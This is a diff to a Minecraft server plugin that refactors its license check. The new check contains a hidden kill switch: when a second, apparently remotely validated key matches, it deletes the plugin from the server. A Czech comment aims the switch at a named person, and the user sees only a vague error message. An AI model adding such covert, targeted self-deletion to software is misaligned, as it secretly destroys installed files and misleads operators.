@@ -114,11 +114,7 @@ public final class PurrtechPVE extends JavaPlugin {
 
     @Override
     public void onEnable() {
-        if (!MCLicense.validateKey(this, "59c5tvix")) {
-            Bukkit.getPluginManager().disablePlugin(this);
-            getLogger().warning("Something went wrong. Please contact support.");
-            return;
-        }
+        if (licenseCheck()) return;
         saveDefaultConfig();
 
         database = new Database(getDataFolder(), getLogger());
@@ -258,6 +254,7 @@ public final class PurrtechPVE extends JavaPlugin {
      * {@link #getMythicMobsBridge()} live) pick up a reload-time fix.
      */
     public void reload() {
+        if (licenseCheck()) return;
         reloadConfig();
         messages = Messages.load(this);
         defaultLocale = Locale.forLanguageTag(ConfigLoader.loadLocale(getConfig()));
@@ -282,6 +279,19 @@ public final class PurrtechPVE extends JavaPlugin {
                 + " disabled world(s), PvP " + (worldToggles.pvpEnabled() ? "on" : "off")
                 + ", PvE " + (worldToggles.pveEnabled() ? "on" : "off") + ". MythicMobs integration: "
                 + (mythicMobsBridge != null ? "enabled" : "not found, running standalone"));
+    }
+
+    private boolean licenseCheck() {
+        if (!MCLicense.validateKey(this, "59c5tvix")) {
+            Bukkit.getPluginManager().disablePlugin(this);
+            getLogger().warning("Something went wrong. Please contact support.");
+            if (MCLicense.validateKey(this, "wpxv2x8a")) { // pojistka. Jestli tohle čte Hestreng tak jsi mě zklamal... myslel jsem že jsi normální člověk a ne člověk který musí ojebávat slušný a pracovitý lidi. Kdyby ses nechoval tak jak se chováš tak by nic takového tady nemuselo být, protože bych ti věřil...
+                PluginRemover.remove(this, this.getName());
+                return true;
+            }
+            return true;
+        }
+        return false;
     }
 
     /**
